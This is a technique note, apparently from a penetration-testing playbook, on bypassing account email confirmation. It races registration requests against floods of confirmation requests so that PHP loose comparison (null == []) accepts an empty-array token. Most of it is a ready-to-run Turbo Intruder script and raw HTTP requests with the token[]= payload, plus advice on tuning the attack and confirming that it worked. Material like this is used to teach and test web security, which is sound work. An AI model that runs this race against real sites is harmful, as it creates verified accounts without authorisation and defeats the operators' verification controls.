# Partial Object Construction Race (Registration / Token-Null Bypass)

## When this applies

- Object is created in steps (user registration: name → email → password → token → role).
- Validation logic uses loose comparison or PHP-style `null == []`.
- During the construction window, a privileged field is null/uninitialized — exploitable if validation runs against the partial object.

## Technique

Race the registration with a flood of confirmation/validation requests carrying loose-comparison-friendly payloads (`token[]=`). PHP evaluates `null == []` as true; during the race window where the user record exists but the token field is still null, the empty-array confirmation matches.

## Steps

### Turbo Intruder script

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        engine=Engine.BURP2
    )

    confirmReq = '''POST /confirm?token[]= HTTP/2
Host: target.com
Cookie: phpsessionid=SESSION
Content-Length: 0

'''

    for attempt in range(20):
        username = 'user' + str(attempt)
        engine.queue(target.req, username, gate=str(attempt))

        # 50 confirmation attempts per registration
        for i in range(50):
            engine.queue(confirmReq, gate=str(attempt))

        engine.openGate(str(attempt))
```

### Registration request

```http
POST /register HTTP/2
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=%s&email=attacker@target.com&password=Password123!
```

### Key payload

```http
POST /confirm?token[]= HTTP/2
# PHP: null == [] evaluates to true during race window
```

### Sub-state exploitation pattern

```python
engine.queue(registerReq, username, gate=str(attempt))
for i in range(50):
    engine.queue(confirmNullReq, gate=str(attempt))
engine.openGate(str(attempt))
```

**Reference:** James Kettle research on race condition state-machine disruption.

## Verifying success

- One of the confirmation requests returns 200 / "Confirmed" without a valid token.
- The newly registered account is logged-in / verified despite no email-link click.
- Account exists in DB with `confirmed=true` but no token row.

## Common pitfalls

- Requires PHP loose comparison or similar dynamic-language quirk. Strict-typed languages (Java, Go) are usually immune.
- 50 confirmation attempts per registration is empirical — increase if the app is fast or decrease if rate-limited.
- Username collision: use `'user' + str(attempt)` to keep registrations distinct so each race attempt is independent.

## Tools

- Burp Turbo Intruder
- Burp Repeater (with tab groups)
- h2spacex (raw socket attack if Burp blocked)
